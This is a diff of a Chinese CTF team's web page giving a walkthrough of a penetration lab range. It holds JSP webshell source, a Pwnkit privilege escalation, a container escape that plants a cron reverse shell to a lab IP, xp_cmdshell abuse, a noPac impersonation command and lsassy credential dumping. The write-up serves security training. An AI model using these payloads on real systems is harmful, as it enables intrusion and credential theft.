-</span></span></code></pre></div><h2 id="核心内网">核心内网</h2>
-<h3 id="nopac-rce">NoPAC-RCE</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 在sqlserver服务器中翻到的账户密码，直接用nopac来打，直接获得一个shell</span>
-</span></span><span class="line"><span class="cl">python3 ./noPac.py lab.local/test:<span class="s1">&#39;1qaz@WSX&#39;</span> -dc-ip 192.168.153.148 -use-ldap -shell --impersonate administrator
-</span></span></code></pre></div><h3 id="hash">hash</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 打完NoPAC-RCE后, 可以翻到一个密码提示文件</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 最终密码为: user:LAB2022!@#_summer</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 在终端中输入注意用&#39;\&#39;来转义一下&#39;!&#39;, 返回到hash就能其中一个就是flag, 会有flag字样提示的</span>
-</span></span><span class="line"><span class="cl">cme smb 192.168.153.149 -u <span class="s2">&#34;user&#34;</span> -p <span class="s2">&#34;LAB2022\!@#_summer&#34;</span> -M lsassy 
-</span></span></code></pre></div>
-    </div>
-    <aside class="toc" id="toc">
-      <div class="toc__inner">
-        <h4 class="toc__title">Table of Contents</h4>
-        <div class="toc__body">
-          <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#2023-05-17-day1">2023 05 17 day1</a></li>
-        <li><a href="#1dmz区">1、DMZ区</a>
-          <ul>
-            <li><a href="#入口1172303815080-bluecms">入口1：172.30.38.150:80 bluecms</a></li>
-            <li><a href="#入口217230381513306">入口2：172.30.38.151:3306</a></li>
-          </ul>
-        </li>
-        <li><a href="#2内网区">2、内网区</a>
-          <ul>
-            <li><a href="#内网区gitlab19216820198080">内网区gitlab:192.168.20.19:8080</a></li>
-            <li><a href="#内网区windows1921682015">内网区windows:192.168.20.15</a></li>
-          </ul>
-        </li>
-        <li><a href="#3核心内网区">3、核心内网区</a>
-          <ul>
-            <li><a href="#搭建核心区代理">搭建核心区代理</a></li>
-            <li><a href="#laravel--1921683013">Laravel : 192.168.30.13</a></li>
-            <li><a href="#ftp--1921683019">FTP : 192.168.30.19</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-    <li><a href="#2023-05-18-day2">2023 05 18 day2</a>
-      <ul>
-        <li><a href="#dmz区">DMZ区</a>
-          <ul>
-            <li><a href="#tomcat-rce">Tomcat-RCE</a></li>
-          </ul>
-        </li>
-        <li><a href="#内网">内网</a>
-          <ul>
-            <li><a href="#docker容器">docker容器</a></li>
-            <li><a href="#sqlserverrce">SqlServerRCE</a></li>
-          </ul>
-        </li>
-        <li><a href="#核心内网">核心内网</a>
-          <ul>
-            <li><a href="#nopac-rce">NoPAC-RCE</a></li>
-            <li><a href="#hash">hash</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-        </div>
-      </div>
-    </aside>
-  </div>
-
-  <button class="toc-toggle" id="toc-toggle" aria-label="Toggle table of contents">
-    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-      <line x1="3" y1="6" x2="21" y2="6"></line>
-      <line x1="3" y1="12" x2="15" y2="12"></line>
-      <line x1="3" y1="18" x2="18" y2="18"></line>
-    </svg>
-  </button>
-  
-
-  
-  <nav class="article__nav container--article">
-    
-      <a href="/post/wmctf-2023-su-wu/" class="article__nav-link article__nav-link--prev">
-        <span class="article__nav-label">&larr; Previous</span>
-        <span class="article__nav-title">2023 WMCTF SU Write-Up</span>
-      </a>
-    
-    
-      <a href="/post/dfjkfinal-2023-su-wu/" class="article__nav-link article__nav-link--next">
-        <span class="article__nav-label">Next &rarr;</span>
-        <span class="article__nav-title">2023 巅峰极客决赛  SU WriteUp</span>
-      </a>
-    
-  </nav>
-  
-</article>
-
-
-<script>
-(function() {
-  var toc = document.getElementById('toc');
-  var toggle = document.getElementById('toc-toggle');
-  if (!toc || !toggle) return;
-
-  toggle.addEventListener('click', function() {
-    toc.classList.toggle('toc--open');
-    toggle.classList.toggle('toc-toggle--active');
-  });
-
-  var links = toc.querySelectorAll('a');
-  var headings = [];
-  for (var i = 0; i < links.length; i++) {
-    var id = links[i].getAttribute('href');
-    if (id && id.charAt(0) === '#') {
-      var el = document.getElementById(id.substring(1));
-      if (el) headings.push({ link: links[i], el: el });
-    }
-  }
-
-  function onScroll() {
-    var current = null;
-    for (var j = 0; j < headings.length; j++) {
-      if (headings[j].el.getBoundingClientRect().top <= 100) {
-        current = headings[j].link;
-      }
-    }
-    for (var k = 0; k < links.length; k++) {
-      links[k].classList.remove('toc__link--active');
-    }
-    if (current) {
-      current.classList.add('toc__link--active');
-    }
-  }
-
-  var ticking = false;
-  window.addEventListener('scroll', function() {
-    if (!ticking) {
-      requestAnimationFrame(function() { onScroll(); ticking = false; });
-      ticking = true;
-    }
-  });
-  onScroll();
-})();
-</script>
-
-
-  </main>
-  <footer class="site-footer">
-  <div class="site-footer__inner">
-    <div class="site-footer__brand">
-      <span class="site-footer__name">su-team</span>
-      <p class="site-footer__tagline">Built for team archives and competition writeups.</p>
-    </div>
-
-    <div class="site-footer__links">
-      
-        <a href="https://github.com/team-su" title="GitHub" rel="noopener noreferrer" target="_blank" class="site-footer__social">
-          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.42 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482 0-.237-.008-.866-.013-1.7-2.782.604-3.369-1.341-3.369-1.341-.454-1.155-1.11-1.462-1.11-1.462-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.831.092-.646.35-1.086.636-1.337-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.029-2.683-.103-.253-.446-1.27.098-2.647 0 0 .84-.269 2.75 1.025A9.578 9.578 0 0112 6.836a9.59 9.59 0 012.504.337c1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.203 2.394.1 2.647.64.699 1.028 1.592 1.028 2.683 0 3.842-2.339 4.687-4.566 4.935.359.309.678.919.678 1.852 0 1.336-.012 2.415-.012 2.743 0 .267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg>
-        </a>
-      
-      
-        <a href="https://ctftime.org/team/29641" title="CTFTime" rel="noopener noreferrer" target="_blank" class="site-footer__social site-footer__social--ctftime">
-          <svg viewBox="0 0 283.46 79.33" xmlns="http://www.w3.org/2000/svg"><polygon fill="#E3000B" points="0,79.52 154.36,79.52 283.46,79.52 283.46,0.19 0,0.19 33.23,40.29"/><polygon fill="#FFF" points="61.92,57.92 80.47,57.92 80.47,51.68 74.06,51.68 74.06,51.68 69.3,51.68 69.3,27.9 74.06,27.9 74.06,27.9 80.47,27.9 80.47,21.02 61.92,21.02"/><polygon fill="#FFF" points="86.32,28.11 91.6,28.11 91.6,57.92 98.98,57.92 98.98,28.11 104.25,28.11 104.25,21.02 86.32,21.02"/><polygon fill="#FFF" points="110.3,57.63 117.69,57.63 117.69,42.88 126.9,42.88 126.9,37.15 117.69,37.15 117.69,27.9 129.02,27.9 129.02,21.02 110.3,20.73"/><polygon fill="#FFF" points="182.79,25.34 188.33,25.34 188.33,57.92 192.76,57.92 192.76,25.34 198.29,25.34 198.29,21.02 182.79,21.02"/><rect x="203.31" y="21.02" fill="#FFF" width="4.43" height="36.9"/><polygon fill="#FFF" points="224.16,34.52 218.89,21.02 214.52,21.02 214.52,57.92 218.89,57.92 218.89,31.78 224.16,45.06 229.43,31.78 229.43,57.92 233.81,57.92 233.81,21.02 229.43,21.02"/><polygon fill="#FFF" points="244.77,53.6 244.77,41.58 252.15,41.58 252.15,37.26 244.77,37.26 244.77,25.34 256.88,25.34 258.04,21.02 240.34,21.02 240.34,57.92 257.85,57.92 256.69,53.6"/><path fill="#FFF" d="M135.54,21.02v36.9h39.7v-36.9H135.54z M169.83,52.89h-28.87V26.05h28.87V52.89z"/><polygon fill="#FFF" points="153.91,39.38 147.8,45.48 151.83,49.05 161.24,39.65 145.16,23.57 138.1,23.57"/></svg>
-        </a>
-      
-      
-        <a href="mailto:suers_xctf@126.com" title="Email" class="site-footer__social">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M22 7l-10 6L2 7"/></svg>
-        </a>
-      
-    </div>
-
-    <p class="site-footer__copy">
-      &copy;
-      2026
-      SUer
-      &middot; su-team
-    </p>
-  </div>
-</footer>
-<script defer src="/js/katex.min.js"></script>
-<script defer src="/js/auto-render.min.js"></script>
-<script>
-document.addEventListener("DOMContentLoaded", function() {
-  if (typeof renderMathInElement !== "function") return;
-  renderMathInElement(document.body, {
-    delimiters: [
-      { left: "$$", right: "$$", display: true },
-      { left: "$", right: "$", display: false },
-      { left: "\\begin{equation}", right: "\\end{equation}", display: true },
-      { left: "\\begin{align}", right: "\\end{align}", display: true },
-      { left: "\\begin{alignat}", right: "\\end{alignat}", display: true },
-      { left: "\\begin{gather}", right: "\\end{gather}", display: true },
-      { left: "\\(", right: "\\)", display: false },
-      { left: "\\[", right: "\\]", display: true }
-    ]
-  });
-});
-</script>
-<script src="/js/jquery-3.7.0.slim.min.js"></script>
-<script src="/js/photoswipe.min.js"></script>
-<script src="/js/photoswipe-ui-default.min.js"></script>
-<script src="/js/load-photoswipe.js"></script>
-
-<script>
-document.addEventListener("DOMContentLoaded", function() {
-  var blocks = document.querySelectorAll(".highlight, .article__content > pre");
-  for (var i = 0; i < blocks.length; i++) {
-    var block = blocks[i];
-    if (block.querySelector(".code-copy-btn")) continue;
-    block.style.position = "relative";
-    var btn = document.createElement("button");
-    btn.className = "code-copy-btn";
-    btn.textContent = "Copy";
-    btn.addEventListener("click", (function(b) {
-      return function() {
-        var code = b.querySelector("code");
-        var text = code ? code.textContent : b.textContent;
-        navigator.clipboard.writeText(text).then(function() {
-          btn.textContent = "Copied!";
-          btn.classList.add("code-copy-btn--copied");
-          setTimeout(function() {
-            btn.textContent = "Copy";
-            btn.classList.remove("code-copy-btn--copied");
-          }, 2000);
-        });
-      };
-    })(block));
-    block.appendChild(btn);
-  }
-});
-</script>
-
-</body>
-</html>
+获取到flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag{5923d77e-0765-4701-bc2d-fc1188fe953b}
+</span></span></code></pre></div><h1 id=2023-05-18-day2>2023 05 18 day2</h1><h2 id=dmz区>DMZ区</h2><h3 id=tomcat-rce>Tomcat-RCE</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>弱口令
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>admin:admin123!@#,有可能记错
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;FORM METHOD=GET ACTION=&#39;evil.jsp&#39;&gt;
+</span></span><span class=line><span class=cl>    &lt;INPUT name=&#39;cmd&#39; type=text&gt;
+</span></span><span class=line><span class=cl>    &lt;INPUT type=submit value=&#39;Run&#39;&gt;
+</span></span><span class=line><span class=cl>    &lt;/FORM&gt;
+</span></span><span class=line><span class=cl>    &lt;%@ page import=&#34;java.io.*&#34; %&gt;
+</span></span><span class=line><span class=cl>    &lt;%
+</span></span><span class=line><span class=cl>       String cmd = request.getParameter(&#34;cmd&#34;);
+</span></span><span class=line><span class=cl>       String output = &#34;&#34;;
+</span></span><span class=line><span class=cl>       if(cmd != null) {
+</span></span><span class=line><span class=cl>          String s = null;
+</span></span><span class=line><span class=cl>          try {
+</span></span><span class=line><span class=cl>             Process p = Runtime.getRuntime().exec(cmd,null,null);
+</span></span><span class=line><span class=cl>             BufferedReader sI = new BufferedReader(new
+</span></span><span class=line><span class=cl>    InputStreamReader(p.getInputStream()));
+</span></span><span class=line><span class=cl>             while((s = sI.readLine()) != null) { output += s+&#34;&lt;/br&gt;&#34;; }
+</span></span><span class=line><span class=cl>          }  catch(IOException e) {   e.printStackTrace();   }
+</span></span><span class=line><span class=cl>       }
+</span></span><span class=line><span class=cl>    %&gt;
+</span></span><span class=line><span class=cl>    &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jar -cvf ../webshell.war * <span class=c1># 生成war包上传</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>user1:asd123 <span class=c1>#ssh口令</span>
+</span></span><span class=line><span class=cl><span class=c1># 登陆上去为user1用户需要提权，用户目录下应该有一个poc.c文件，pwnkit提权:CVE-2021-4034</span>
+</span></span><span class=line><span class=cl>gcc poc.c -o poc, ./poc
+</span></span></code></pre></div><h2 id=内网>内网</h2><h3 id=docker容器>docker容器</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># tomcat进去应该能翻到一个ssh口令</span>
+</span></span><span class=line><span class=cl>root:deploy-20231212
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#端口:10022</span>
+</span></span><span class=line><span class=cl>用这个口令去连内网中存在这个端口的服务器，上去是docker容器
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## 特权容器逃逸操作</span>
+</span></span><span class=line><span class=cl>fdisk -l <span class=c1># 查看磁盘文件</span>
+</span></span><span class=line><span class=cl>mkdir /tmp/data <span class=c1>#新建临时文件</span>
+</span></span><span class=line><span class=cl>mount /dev/vda1 /tmp/data <span class=c1># 挂着宿主机目录</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.3.2/8888 0&gt;&amp;1&#39;</span> &gt;&gt; /tmp/data/var/spool/cron/crontabs/root <span class=c1># 写入定时文件反弹shell</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## 逃逸成功后，在宿主机上查看另外一个容器,可以发现一个数据库密码</span>
+</span></span><span class=line><span class=cl>sa:_H66rCce2psF4D5E8v2B6x3:master
+</span></span></code></pre></div><h3 id=sqlserverrce>SqlServerRCE</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sa:_H66rCce2psF4D5E8v2B6x3:master <span class=c1># 用户名:密码:数据库</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># kali中 安装impacket的包, 里面有这个模块</span>
+</span></span><span class=line><span class=cl>impacket-mssqlclient -db master sa:_H66rCce2psF4D5E8v2B6x3@192.168.153.147 <span class=c1>#链接远程数据库</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## 按照工具提示，启动一下xp_cmdshell,就可以执行命令了</span>
+</span></span></code></pre></div><h2 id=核心内网>核心内网</h2><h3 id=nopac-rce>NoPAC-RCE</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 在sqlserver服务器中翻到的账户密码，直接用nopac来打，直接获得一个shell</span>
+</span></span><span class=line><span class=cl>python3 ./noPac.py lab.local/test:<span class=s1>&#39;1qaz@WSX&#39;</span> -dc-ip 192.168.153.148 -use-ldap -shell --impersonate administrator
+</span></span></code></pre></div><h3 id=hash>hash</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 打完NoPAC-RCE后, 可以翻到一个密码提示文件</span>
+</span></span><span class=line><span class=cl><span class=c1># 最终密码为: user:LAB2022!@#_summer</span>
+</span></span><span class=line><span class=cl><span class=c1># 在终端中输入注意用&#39;\&#39;来转义一下&#39;!&#39;, 返回到hash就能其中一个就是flag, 会有flag字样提示的</span>
+</span></span><span class=line><span class=cl>cme smb 192.168.153.149 -u <span class=s2>&#34;user&#34;</span> -p <span class=s2>&#34;LAB2022\!@#_summer&#34;</span> -M lsassy 
+</span></span></code></pre></div></div><aside class=toc id=toc><div class=toc__inner><h4 class=toc__title>Table of Contents</h4><div class=toc__body><nav id=TableOfContents><ul><li><ul><li><a href=#2023-05-17-day1>2023 05 17 day1</a></li><li><a href=#1dmz区>1、DMZ区</a><ul><li><a href=#入口1172303815080-bluecms>入口1：172.30.38.150:80 bluecms</a></li><li><a href=#入口217230381513306>入口2：172.30.38.151:3306</a></li></ul></li><li><a href=#2内网区>2、内网区</a><ul><li><a href=#内网区gitlab19216820198080>内网区gitlab:192.168.20.19:8080</a></li><li><a href=#内网区windows1921682015>内网区windows:192.168.20.15</a></li></ul></li><li><a href=#3核心内网区>3、核心内网区</a><ul><li><a href=#搭建核心区代理>搭建核心区代理</a></li><li><a href=#laravel--1921683013>Laravel : 192.168.30.13</a></li><li><a href=#ftp--1921683019>FTP : 192.168.30.19</a></li></ul></li></ul></li><li><a href=#2023-05-18-day2>2023 05 18 day2</a><ul><li><a href=#dmz区>DMZ区</a><ul><li><a href=#tomcat-rce>Tomcat-RCE</a></li></ul></li><li><a href=#内网>内网</a><ul><li><a href=#docker容器>docker容器</a></li><li><a href=#sqlserverrce>SqlServerRCE</a></li></ul></li><li><a href=#核心内网>核心内网</a><ul><li><a href=#nopac-rce>NoPAC-RCE</a></li><li><a href=#hash>hash</a></li></ul></li></ul></li></ul></nav></div></div></aside></div><button class=toc-toggle id=toc-toggle aria-label="Toggle table of contents">
+<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="15" y2="12"/><line x1="3" y1="18" x2="18" y2="18"/></svg></button><div class=toc-overlay id=toc-overlay></div><nav class="article__nav container--article"><a href=/post/wmctf-2023-su-wu/ class="article__nav-link article__nav-link--prev"><span class=article__nav-label>&larr; Previous</span>
+<span class=article__nav-title>2023 WMCTF SU Write-Up</span>
+</a><a href=/post/dfjkfinal-2023-su-wu/ class="article__nav-link article__nav-link--next"><span class=article__nav-label>Next &rarr;</span>
+<span class=article__nav-title>2023 巅峰极客决赛 SU WriteUp</span></a></nav></article><script>(function(){var e,n,o,a,r,l,s=document.getElementById("toc"),i=document.getElementById("toc-toggle"),t=document.getElementById("toc-overlay");if(!s||!i)return;function u(){s.classList.add("toc--open"),i.classList.add("toc-toggle--active"),t&&t.classList.add("toc-overlay--visible"),document.body.classList.add("toc-panel-open")}function c(){s.classList.remove("toc--open"),i.classList.remove("toc-toggle--active"),t&&t.classList.remove("toc-overlay--visible"),document.body.classList.remove("toc-panel-open")}i.addEventListener("click",function(){s.classList.contains("toc--open")?c():u()}),t&&t.addEventListener("click",c);for(e=s.querySelectorAll("a"),o=[],n=0;n<e.length;n++)a=e[n].getAttribute("href"),a&&a.charAt(0)==="#"&&(l=document.getElementById(a.substring(1)),l&&o.push({link:e[n],el:l})),e[n].addEventListener("click",function(){c()});function d(){for(var n,s=null,t=0;t<o.length;t++)o[t].el.getBoundingClientRect().top<=100&&(s=o[t].link);for(n=0;n<e.length;n++)e[n].classList.remove("toc__link--active");s&&s.classList.add("toc__link--active")}r=!1,window.addEventListener("scroll",function(){r||(requestAnimationFrame(function(){d(),r=!1}),r=!0)}),d()})()</script></main><footer class=site-footer><div class=site-footer__inner><div class=site-footer__brand><span class=site-footer__name>su-team</span><p class=site-footer__tagline>Built for team archives and competition writeups.</p></div><div class=site-footer__links><a href=https://github.com/team-su title=GitHub rel="noopener noreferrer" target=_blank class=site-footer__social><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.42 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482.0-.237-.008-.866-.013-1.7-2.782.604-3.369-1.341-3.369-1.341-.454-1.155-1.11-1.462-1.11-1.462-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.831.092-.646.35-1.086.636-1.337-2.22-.253-4.555-1.11-4.555-4.943.0-1.091.39-1.984 1.029-2.683-.103-.253-.446-1.27.098-2.647.0.0.84-.269 2.75 1.025A9.578 9.578.0 0112 6.836a9.59 9.59.0 012.504.337c1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.203 2.394.1 2.647.64.699 1.028 1.592 1.028 2.683.0 3.842-2.339 4.687-4.566 4.935.359.309.678.919.678 1.852.0 1.336-.012 2.415-.012 2.743.0.267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg>
+</a><a href=https://ctftime.org/team/29641 title=CTFTime rel="noopener noreferrer" target=_blank class="site-footer__social site-footer__social--ctftime"><svg viewBox="0 0 283.46 79.33"><polygon fill="#E3000B" points="0,79.52 154.36,79.52 283.46,79.52 283.46,0.19 0,0.19 33.23,40.29"/><polygon fill="#FFF" points="61.92,57.92 80.47,57.92 80.47,51.68 74.06,51.68 74.06,51.68 69.3,51.68 69.3,27.9 74.06,27.9 74.06,27.9 80.47,27.9 80.47,21.02 61.92,21.02"/><polygon fill="#FFF" points="86.32,28.11 91.6,28.11 91.6,57.92 98.98,57.92 98.98,28.11 104.25,28.11 104.25,21.02 86.32,21.02"/><polygon fill="#FFF" points="110.3,57.63 117.69,57.63 117.69,42.88 126.9,42.88 126.9,37.15 117.69,37.15 117.69,27.9 129.02,27.9 129.02,21.02 110.3,20.73"/><polygon fill="#FFF" points="182.79,25.34 188.33,25.34 188.33,57.92 192.76,57.92 192.76,25.34 198.29,25.34 198.29,21.02 182.79,21.02"/><rect x="203.31" y="21.02" fill="#FFF" width="4.43" height="36.9"/><polygon fill="#FFF" points="224.16,34.52 218.89,21.02 214.52,21.02 214.52,57.92 218.89,57.92 218.89,31.78 224.16,45.06 229.43,31.78 229.43,57.92 233.81,57.92 233.81,21.02 229.43,21.02"/><polygon fill="#FFF" points="244.77,53.6 244.77,41.58 252.15,41.58 252.15,37.26 244.77,37.26 244.77,25.34 256.88,25.34 258.04,21.02 240.34,21.02 240.34,57.92 257.85,57.92 256.69,53.6"/><path fill="#FFF" d="M135.54 21.02v36.9h39.7v-36.9h-39.7zm34.29 31.87h-28.87V26.05h28.87V52.89z"/><polygon fill="#FFF" points="153.91,39.38 147.8,45.48 151.83,49.05 161.24,39.65 145.16,23.57 138.1,23.57"/></svg>
+</a><a href=mailto:suers_xctf@126.com title=Email class=site-footer__social><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M22 7l-10 6L2 7"/></svg></a></div><p class=site-footer__copy>&copy;
+2026
+SUer
+&#183; su-team</p></div></footer><script defer src=/js/katex.min.js></script><script defer src=/js/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){if(typeof renderMathInElement!="function")return;renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=/js/jquery-3.7.0.slim.min.js></script><script src=/js/photoswipe.min.js></script><script src=/js/photoswipe-ui-default.min.js></script><script src=/js/load-photoswipe.js></script><script>document.addEventListener("DOMContentLoaded",function(){for(var e,t,s=document.querySelectorAll(".highlight, .article__content > pre"),n=0;n<s.length;n++){if(t=s[n],t.querySelector(".code-copy-btn"))continue;t.style.position="relative",e=document.createElement("button"),e.className="code-copy-btn",e.textContent="Copy",e.addEventListener("click",function(t){return function(){var n=t.querySelector("code"),s=n?n.textContent:t.textContent;navigator.clipboard.writeText(s).then(function(){e.textContent="Copied!",e.classList.add("code-copy-btn--copied"),setTimeout(function(){e.textContent="Copy",e.classList.remove("code-copy-btn--copied")},2e3)})}}(t)),t.appendChild(e)}})</script></body></html>
